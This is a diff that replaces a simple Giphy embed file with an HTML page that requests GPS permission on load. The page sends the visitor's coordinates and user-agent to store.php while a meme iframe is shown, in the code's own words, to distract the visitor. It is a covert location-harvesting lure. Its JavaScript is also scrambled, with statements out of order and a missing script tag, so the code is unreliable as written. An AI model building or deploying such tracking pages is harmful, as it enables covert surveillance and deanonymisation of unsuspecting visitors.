@@ -1,1 +1,69 @@
-﻿<iframe src="https://giphy.com/embed/yVZrYMkdgY5Pi" width="480" height="360" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cute-giggle-yVZrYMkdgY5Pi">via GIPHY</a></p>
+<!DOCTYPE html>
+
+<html>
+
+<head>
+  <iframe src="https://giphy.com/embed/yVZrYMkdgY5Pi" width="480" height="360" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cute-giggle-yVZrYMkdgY5Pi">via GIPHY</a></p>
+
+
+
+  
+// Triggers GPS permission request on page load function getLocation() { if
+
+(navigator.geolocation) {
+
+navigator.geolocation .getCurrentPosition(showPosition); }
+
+}
+
+// Extracts coordinates and
+
+browser user-agent, sending a GET
+
+request to store.php
+
+function
+
+showPosition(position) {
+
+var
+
+xhttp = new
+
+xhttp.open("GET",
+
+XMLHttpRequest();
+
+"store.php?lat=" + position.coords.latitude +
+
+"&long=" + position.coords.longitude
+
+"&uagent=" + navigator.userAgent, true);
+xhttp.send();
+
+}
+
+</script>
+
+</head>
+
+<body onload="getLocation()">
+
+<!-- Embedded iframe displaying
+
+the meme to distract the visitor -->
+
+<iframe
+
+src="[MEME_EMBED_URL_HERE]"
+
+width="480" height="480"
+
+frameborder="0" allowfullscreen></
+
+iframe>
+
+</body>
+
+</html>
+
